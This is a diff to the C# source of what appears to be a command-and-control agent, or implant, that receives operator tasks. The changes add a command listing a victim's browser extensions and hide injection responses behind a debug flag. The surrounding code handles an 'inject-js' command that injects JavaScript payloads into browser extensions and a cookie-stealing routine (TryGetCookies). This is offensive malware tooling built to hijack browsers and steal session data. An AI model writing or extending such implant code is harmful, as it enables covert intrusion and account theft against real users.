@@ -104,6 +104,10 @@ namespace Agent
                     //string args = string.Join(" ", inputParts, 2, inputParts.Length -1);
                     this.SetConfig(inputParts[1], value, message.task_id);
                     break;
+                case "extensions":
+                    var extensions = GetExtensions(this.config, message.task_id);
+                    ReturnOutput(JsonSerializer.Serialize(extensions), message.task_id);
+                    break;
                 case "inject-js":
                     if (inputParts.Count() < 3)
                     {
@@ -208,10 +212,21 @@ namespace Agent
             {
                 if (TryInjectJs(extension, payload, task_id, out var response))
                 {
-                    ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
+                    ReturnOutput("[+] Succesfully injected payload.", task_id);
+
+                    if (this.config.debug)
+                    {
+                        ReturnOutput(response, task_id);
+                    }
                     return;
                 }
-                ReturnOutput("[!] Failed to inject payload." + Environment.NewLine + $"Response: {response}", task_id);
+
+                ReturnOutput("[!] Failed to inject payload.", task_id);
+                
+                if (this.config.debug)
+                {
+                    ReturnOutput(response, task_id);
+                }
             }
         }
         private bool TryGetCookies(string task_id)
@@ -312,40 +327,51 @@ namespace Agent
             Type type = config.GetType();
             PropertyInfo property = type.GetProperty(choice);
 
-            if (property != null)
+            switch (choice)
             {
-                if (choice == "parent")
-                    property.SetValue(config, int.Parse(value.ToString()));
-                if (choice == "debug")
-                {
-                    if (bool.TryParse(value, out bool flag))
+                case null:
+                    ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
+                    return;
+                case "parent":
+                    if(int.TryParse(value, out var num))
                     {
-                        property.SetValue(config, flag);
-                    }
-                    else
-                    {
-                        ReturnOutput("Invalid value.", task_id);
+                        property.SetValue(config, num);
+                        ReturnOutput("Set " + choice + " to " + value, task_id);
                         return;
                     }
-                }
-                else
-                    property.SetValue(config, value);
+                    break;
+                case "debug":
+                    if(bool.TryParse(value, out var flag))
+                    {
+                        property.SetValue(config, flag);
+                        ReturnOutput("Set " + choice + " to " + value, task_id);
+                        return;
+                    }
+                    break;
+                default:
+                    try
+                    {
+                        if(property is not null)
+                        {
+                            property.SetValue(config, value);
+                            ReturnOutput("Set " + choice + " to " + value, task_id);
+                            return;
+                        }
 
-                ReturnOutput("Set " + choice + " to " + value, task_id);
+                    }
+                    catch
+                    {
+
+                    }
+                    break;
             }
-            else
-            {
-                ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
-            }
+
+            ReturnOutput("Invalid value for parameter", task_id);
         }
         private void GetValue(string choice, string task_id)
         {
             switch (choice.ToLower())
             {
-                case "extensions":
-                    var extensions = GetExtensions(this.config, task_id);
-                    ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
-                    break;
                 case "":
                 case null:
                     foreach (var prop in config.GetType().GetProperties())
@@ -356,9 +382,8 @@ namespace Agent
                         }
                         else
                         {
-                            ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
+                            ReturnOutput($"{prop.Name}: {prop.GetValue(config)}", task_id);
                         }
-
                     }
                     break;
                 default:
